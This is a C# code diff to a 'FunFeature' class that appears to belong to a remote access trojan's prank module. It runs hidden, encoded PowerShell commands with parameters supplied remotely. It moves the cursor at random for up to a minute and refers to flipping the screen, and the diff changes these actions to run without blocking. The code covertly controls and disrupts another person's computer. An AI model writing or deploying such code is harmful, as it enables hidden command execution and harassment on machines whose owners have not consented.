@@ -134,8 +134,7 @@ internal static class FunFeature
                         var psi1 = new System.Diagnostics.ProcessStartInfo("powershell", $"-NoP -NonI -W H -EncodedCommand {enc1}")
                         { CreateNoWindow = true, UseShellExecute = false };
                         psi1.Environment["SERO_TTS"] = param;
-                        using var p1 = System.Diagnostics.Process.Start(psi1);
-                        p1?.WaitForExit(15000);
+                        System.Diagnostics.Process.Start(psi1);
                     }
                     break;
 
@@ -158,14 +157,17 @@ internal static class FunFeature
                     int.TryParse(param, out int seconds);
                     if (seconds < 1) seconds = 10;
                     if (seconds > 60) seconds = 60;
-                    var rnd = new Random();
-                    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
-                    var end = DateTime.UtcNow.AddSeconds(seconds);
-                    while (DateTime.UtcNow < end)
+                    Task.Run(() =>
                     {
-                        SetCursorPos(rnd.Next(0, w), rnd.Next(0, h));
-                        Thread.Sleep(50);
-                    }
+                        var rnd = new Random();
+                        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+                        var end = DateTime.UtcNow.AddSeconds(seconds);
+                        while (DateTime.UtcNow < end)
+                        {
+                            SetCursorPos(rnd.Next(0, w), rnd.Next(0, h));
+                            Thread.Sleep(50);
+                        }
+                    });
                     break;
 
                 // ── Flip Screen ───────────────────────────────────────────
@@ -291,15 +293,6 @@ internal static class FunFeature
         catch { }
     }
 
-    private static void RunDetached(string exe, string args)
-    {
-        try
-        {
-            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(exe, args)
-            { UseShellExecute = false, CreateNoWindow = false });
-        }
-        catch { }
-    }
 }
 
 internal class FunCmdDataStub    { public string Action { get; set; } = ""; public string Param { get; set; } = ""; }
